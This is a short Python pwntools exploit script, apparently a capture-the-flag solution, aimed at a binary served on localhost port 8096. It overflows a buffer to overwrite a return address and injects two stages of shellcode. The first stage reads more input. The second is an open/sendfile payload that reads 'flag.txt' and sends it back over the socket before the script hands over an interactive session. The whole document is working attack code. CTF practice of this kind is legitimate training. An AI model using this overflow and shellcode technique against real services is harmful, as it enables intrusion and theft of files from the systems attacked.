#!/usr/bin/env python3



from pwn import *
from time import sleep

context.arch = "amd64"
e = ELF("../a.out")
r = remote("127.0.0.1",8096)
shellcode = asm("""
        mov rdi,rdx
        mov dl,0xff
        syscall""")
shellcode2 = asm("""
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        mov rdi,rsi
        xor rsi,rsi
        xor rdx,rdx
        mov rax,2
        syscall
        mov rsi,rax
        mov rdi,4
        mov rdx,0
        mov r10,100
        mov rax,40
        syscall""")
value = b"done\x00\x00\x00\x00" + b"A" * 32 + p64(0x40185d) + shellcode
r.send(value)
sleep(1)
exploit = b"flag.txt" + b"\x00" * 32 + p64(0x40185d) + shellcode2
r.send(exploit)
r.interactive()
